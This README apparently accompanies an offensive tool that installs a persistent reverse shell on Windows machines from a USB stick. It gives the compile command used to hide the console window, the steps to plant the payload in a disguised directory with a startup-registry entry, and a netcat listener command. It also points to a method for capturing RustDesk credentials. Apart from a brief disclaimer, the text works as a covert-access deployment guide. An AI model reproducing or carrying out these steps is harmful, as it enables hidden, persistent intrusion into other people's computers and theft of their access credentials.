# Windows Persistent Reverse Shell via USB

A USB-based deployment system that establishes a persistent reverse shell on Windows targets. With additional methods using RustDesk for GUI access.

## Overview

This tool installs a payload (`updater.exe`) to a hidden directory (`C:\Windows~\`) and adds it to the Windows startup registry. Once installed, the payload automatically connects to a listener on each system boot, providing persistent remote access.

## Components

- **install.vbs** - VBScript that deploys the payload and configures persistence (`install.vbs`)
- **updater.exe** - Compiled reverse shell payload (from `shell.cs`)
- **shell.cs** - C# source code for the reverse shell

## Installation


## .env File

in your own directory create a .env file wwith the variables 

 **localIP** - this is the ip that the payload will try to attatch itself to. This dosent need to be local. if your ip is wrong your listener wont work
 **myPORT** - this is the port you will also use for your listener once again if its wrong your listener wont work. (for example 4444)


### 1. Compile the Payload

On your Debian/Linux machine, compile the C# reverse shell into a Windows executable:
```bash
mcs -target:winexe shell.cs -out:updater.exe
```

> **Note:** The `-target:winexe` flag is critical - it prevents a visible command prompt window from appearing on the target machine.

### 2. Copy Files to USB

Transfer both files to your USB drive:
```bash
cp install.vbs /media/ep/6197-1B82/
cp updater.exe /media/ep/6197-1B82/
```

> **Note:** Adjust the USB mount path (`/media/ep/6197-1B82/`) to match your system.

### 3. Deploy on Target

Insert the USB into the target machine and run `install.vbs`. This will:
- Create the hidden directory `C:\Windows~\`
- Copy `updater.exe` to the hidden directory
- Add the payload to the Windows startup registry
- Execute the payload immediately

!! All you need to do on the target machine is run the install.vbs file !!
## Usage

### Start the Listener

On your Debian/Linux machine, start a netcat listener:
```bash
nc -lvnp YOURPORT-example 4444
```

### Behavior

- The payload connects back to your listener on your selected port which you used in your env file to compile
- Connection is re-established automatically on every system reboot
- If the listener is offline, the payload will retry on next boot

## Persistence Mechanism

The installer adds the payload to the Windows startup registry, ensuring it runs automatically when the target machine starts. This provides persistent access even after:
- System reboots
- User logouts
- Temporary network disconnections

## Remote Desktop Access

For GUI access, see the [RustDesk integration guide](RUSTDESK.md) which explains how to capture RustDesk credentials via screenshot.

## Disclaimer

This tool is for educational and authorized security testing purposes only. Unauthorized access to computer systems is illegal. Always obtain explicit permission before testing.